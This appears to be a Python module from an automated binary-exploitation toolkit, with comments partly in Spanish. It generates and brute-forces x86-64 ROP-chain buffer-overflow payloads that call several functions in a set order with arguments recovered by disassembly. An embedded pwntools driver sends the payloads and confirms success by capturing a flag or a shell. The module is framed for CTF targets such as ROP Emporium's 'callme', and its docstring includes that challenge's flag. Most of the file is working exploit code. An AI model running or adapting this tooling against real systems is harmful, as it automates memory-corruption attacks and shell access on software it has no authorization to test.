"""Sequential multi-function call with per-function validated arguments, verified by execution.

Some binaries don't have ONE gift function to jump to -- they require calling SEVERAL, each with
its OWN fixed set of arguments, IN A SPECIFIC ORDER, before anything (a flag, a shell) is granted.
This is a distinct primitive from `autocsu.py` (one call, args via universal gadgets) or
`autopoc.py` (one call, no args): here the overflow reaches a plain `pop rdi; pop rsi; pop rdx; ret`
-style gadget directly (gadget-rich, not gadget-poor), so there's no csu trick needed -- the only
hard part is knowing WHICH functions to call, with WHAT arguments, and in WHAT order.

Added after testing against a real CTF binary -- ROP Emporium's own `callme` challenge, not one of
this project's synthetic fixtures. Confirmed live: calling `callme_one`/`callme_two`/`callme_three`
(found purely by the same gift-keyword heuristic `autopoc.find_win`/`autocsu.py` already use, local
OR imported from a linked shared library, exactly like `autocsu.py`'s strategy C) with the WRONG
order (alphabetical: one, three, two) silently calls each function with the right arguments but
still produces a corrupted flag -- order matters and there's no reliable name-based rule to infer
it generically ("one/two/three" is this challenge's own convention, not a universal one). Rather
than guess, this tries every ORDERING of the discovered targets (cheap: 3 targets is 6 permutations,
4 is 24, each one quick to test) until one produces a real flag or shell. Each target's own exact
argument values are recovered the same way `autocsu.py`'s strategy C does: disassemble its prologue
with capstone (`mov [rbp-N], <argreg>` to map a stack slot to its register, then
`movabs <reg>, imm64` + `cmp [rbp-N], <reg>` for the value it checks), confirmed live to recover
0xdeadbeefdeadbeef/0xcafebabecafebabe/0xd00df00dd00df00d for all three real functions with zero
hardcoded knowledge of the challenge. Verified live end to end: the correct order (one, two, three)
returns the real flag `ROPE{C4ll1ng_w1th_params_1n_x64}`; the wrong order corrupts it (no false
positive -- the flag pattern simply doesn't match garbled output). For AUTHORIZED / CTF targets."""
from __future__ import annotations

import os

from ._sandbox import run_driver
from .autocsu import _infer_fixed_args
from .autopivot import _dyn_needed, _undefined_funcs

try:
    from elftools.elf.elffile import ELFFile  # type: ignore
    _HAVE_ELFTOOLS = True
except Exception:
    _HAVE_ELFTOOLS = False

from .autopoc import _GIFT_RE

_MAX_TARGETS = 4   # 4! = 24 permutations, still cheap; more than this is almost certainly noise


def _defined_funcs_with_size(path: str) -> dict:
    """Como `autopivot._defined_funcs`, pero tambien guarda `st_size` -- necesario para acotar
    `_infer_fixed_args` al cuerpo REAL de cada funcion (ver nota en esa funcion: sin acotar, una
    funcion diminuta seguida de cerca por otra que si valida argumentos le robaba los valores de
    la vecina). Devuelve {nombre: (direccion, tamano)}."""
    out = {}
    try:
        with open(path, "rb") as f:
            elf = ELFFile(f)
            for secname in (".symtab", ".dynsym"):
                sec = elf.get_section_by_name(secname)
                if not sec:
                    continue
                for s in sec.iter_symbols():
                    if (s.name and s["st_info"]["type"] == "STT_FUNC"
                            and s["st_shndx"] != "SHN_UNDEF" and s["st_value"]):
                        out[s.name] = (s["st_value"], s["st_size"])
    except Exception:
        pass
    return out


def _args_tuple(vals: dict) -> tuple:
    return (vals.get("rdi", 0x1337), vals.get("rsi", 0xdead), vals.get("rdx", 0xbeef))


def _find_call_targets(binary: str) -> list:
    """Encuentra TODOS los targets de llamada (no solo el primero) de un binario con el patron
    real 'llama a VARIAS funciones, cada una con sus propios argumentos exactos' (confirmado en
    vivo contra el callme real de ROP Emporium). Dos niveles de busqueda, por orden:
    1) por NOMBRE (`_GIFT_RE`, igual que autopoc.py/autocsu.py) -- local primero, luego
       importado de una shared lib enlazada.
    2) si eso no encuentra al menos 2, por ESTRUCTURA: cualquier funcion (local, o si no hay
       ninguna, de una lib enlazada) cuyo PROPIO cuerpo `_infer_fixed_args` reconoce como
       'valida registros de entrada contra constantes fijas' -- sin asumir ningun nombre, para
       cuando el reto no usa win/shell/flag/backdoor/give en absoluto (como 'callme_one/two/
       three': no matchean ningun nombre 'regalo' conocido, pero SI tienen el patron exacto).
    Devuelve una lista de (nombre, direccion_local_o_None, (rdi,rsi,rdx)); la direccion es None
    cuando el target esta importado (se llama via el PLT del binario principal)."""
    if not _HAVE_ELFTOOLS:
        return []
    local = _defined_funcs_with_size(binary)
    gift_local = sorted(n for n in local if _GIFT_RE.search(n.lower()))
    results = []
    for n in gift_local[:_MAX_TARGETS]:
        addr, size = local[n]
        vals = _infer_fixed_args(binary, addr, size=size)
        results.append((n, addr, _args_tuple(vals)))
    if len(results) >= 2:
        return results

    undef = _undefined_funcs(binary)
    gift_undef = sorted(n for n in undef if _GIFT_RE.search(n.lower()))
    if gift_undef:
        d = os.path.dirname(os.path.abspath(binary))
        for libname in _dyn_needed(binary):
            p = os.path.join(d, libname)
            if not os.path.isfile(p):
                continue
            defs = _defined_funcs_with_size(p)
            matches = [n for n in gift_undef if n in defs][:_MAX_TARGETS]
            if len(matches) >= 2:
                return [(n, None, _args_tuple(_infer_fixed_args(p, defs[n][0], size=defs[n][1])))
                        for n in matches]

    # Fallback estructural: ninguna coincidencia de nombre -- busca por el PATRON de
    # validacion de argumentos en si, primero localmente, luego en cada lib enlazada cuyas
    # funciones tambien esten importadas (para poder llamarlas via el PLT del binario).
    struct_local = [(n, a, sz) for n, (a, sz) in local.items()]
    found = []
    for n, a, sz in struct_local:
        vals = _infer_fixed_args(binary, a, size=sz)
        if vals:
            found.append((n, a, _args_tuple(vals)))
    if len(found) >= 2:
        return found[:_MAX_TARGETS]

    undef = _undefined_funcs(binary)
    d = os.path.dirname(os.path.abspath(binary))
    for libname in _dyn_needed(binary):
        p = os.path.join(d, libname)
        if not os.path.isfile(p):
            continue
        defs = _defined_funcs_with_size(p)
        found = []
        for n, (a, sz) in defs.items():
            if n not in undef:        # solo funciones que este binario SI importa (PLT real)
                continue
            vals = _infer_fixed_args(p, a, size=sz)
            if vals:
                found.append((n, None, _args_tuple(vals)))
        if len(found) >= 2:
            return found[:_MAX_TARGETS]
    return []


_DRIVER = r'''
import sys, time, re, itertools, json
from pwn import ELF, ROP, context, p64, process
name = sys.argv[1]
_TARGETS = json.loads(sys.argv[2]) if len(sys.argv) > 2 and sys.argv[2] else []
context.binary = elf = ELF(name, checksec=False); context.log_level = "error"; context.arch = "amd64"
if elf.bits != 64:
    print("NOT_APPLICABLE (callme driver is x86-64)"); sys.exit(1)
if not _TARGETS:
    print("NOT_APPLICABLE (no targets)"); sys.exit(1)

rop = ROP(elf)
g = rop.find_gadget(["pop rdi", "pop rsi", "pop rdx", "ret"])
if g is None:
    print("NOT_APPLICABLE (no pop rdi; pop rsi; pop rdx; ret gadget)"); sys.exit(1)

resolved = []
for tname, taddr, (a1, a2, a3) in _TARGETS:
    callable_addr = taddr if taddr else (elf.plt.get(tname) or (elf.symbols or {}).get(tname))
    if callable_addr is None:
        print("NOT_APPLICABLE (%s no resoluble)" % tname); sys.exit(1)
    resolved.append((tname, callable_addr, int(a1, 16), int(a2, 16), int(a3, 16)))

_FLAG_RE = re.compile(r"[A-Za-z0-9_]+\{[^}\n]{1,80}\}")
MARK = b"BINORACLE_CALLME_PWNED"

def run(payload):
    io, out = None, b""
    try:
        io = process([name])
        try: io.recvrepeat(0.2)
        except Exception: pass
        io.send(payload); time.sleep(0.2)
        try: out += io.recvrepeat(0.3)
        except Exception: pass
        try:
            io.sendline(b"echo " + MARK + b"; id"); time.sleep(0.35)
            out += io.recvrepeat(1.1)
        except Exception:
            pass
    except Exception:
        pass
    finally:
        try:
            if io: io.close()
        except Exception: pass
    shelled = (MARK in out) or (b"uid=" in out)
    fm = _FLAG_RE.search(out.decode("latin1", "replace"))
    if shelled:
        return "shell", None
    if fm:
        return "flag", fm.group(0)
    return None, None

def chain_for(order):
    c = b""
    for tname, addr, a1, a2, a3 in order:
        c += p64(g.address) + p64(a1) + p64(a2) + p64(a3) + p64(addr)
    return c

for off in [40, 32, 48, 56, 24, 64, 72, 80]:
    for order in itertools.permutations(resolved):
        payload = b"A" * off + chain_for(order)
        kind, extra = run(payload)
        if kind == "flag":
            print("VERIFIED off=%d order=%s flag=%s" % (off, ",".join(t[0] for t in order), extra))
            sys.exit(0)
        if kind == "shell":
            print("VERIFIED off=%d order=%s" % (off, ",".join(t[0] for t in order)))
            sys.exit(0)

print("NOT_VERIFIED")
sys.exit(1)
'''


def _callme_applicable(binary: str) -> bool:
    """Chequeo barato (sin sandbox): necesita al menos 2 nombres 'regalo' (con 1 solo target,
    autopoc.py/autocsu.py ya lo cubren mejor -- este primitivo es especificamente para la
    secuencia de VARIAS llamadas). El gadget `pop rdi; pop rsi; pop rdx; ret` se busca dentro
    del driver, donde ya hay pwntools/ROP cargado."""
    return len(_find_call_targets(binary)) >= 2


def autocallme(binary: str) -> dict:
    """Llamada secuencial a VARIAS funciones 'regalo', cada una con sus propios argumentos
    exactos (recuperados por desensamblado) -- probando TODOS los ordenes posibles, no
    asumiendo ninguno. Para el patron real de ret2csu-style 'callme' challenges. Docker o
    sandbox nativo; degrada limpio."""
    targets = _find_call_targets(binary)
    if len(targets) < 2:
        return {"ok": False, "note": "no aplicable (menos de 2 funciones 'regalo' encontradas)"}
    import json as _json
    args = [_json.dumps([[n, a, [hex(x) for x in v]] for n, a, v in targets])]
    res = run_driver(binary, _DRIVER, ".binoracle_callme.py", args=args)
    if not res.get("ok"):
        return res
    eng = res.get("engine", "sandbox")
    res["note"] = (f"llamadas secuenciales con args validados: shell/flag verificada ({eng})"
                   if res.get("verified")
                   else f"callme: no verificado ({eng}) (orden/args/timing)")
    return res


def render_callme(r: dict) -> str:
    out = ["## Auto callme (llamadas secuenciales con argumentos, verificado)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- shell/flag verificada en sandbox: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("detail"):
        out.append(f"- `{r['detail']}`")
    out.append("- " + r.get("note", ""))
    if r.get("output"):
        out.append("\n### salida\n```\n" + r["output"].strip() + "\n```")
    return "\n".join(out)
